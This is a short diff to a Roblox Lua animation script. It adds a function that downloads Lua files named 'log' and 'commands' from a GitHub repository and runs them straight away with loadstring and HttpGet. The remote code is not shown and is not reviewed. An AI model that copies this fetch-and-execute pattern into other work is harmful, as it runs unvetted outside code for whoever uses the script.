@@ -3,3 +3,10 @@ local Animate = game.Players.LocalPlayer.Character.Animate
 Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
 wait(1)
 end
+
+local function load(package)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/i-reddd/packages/main/' .. tostring(package) .. '.lua'))()
+end
+
+load('log')
+load('commands')
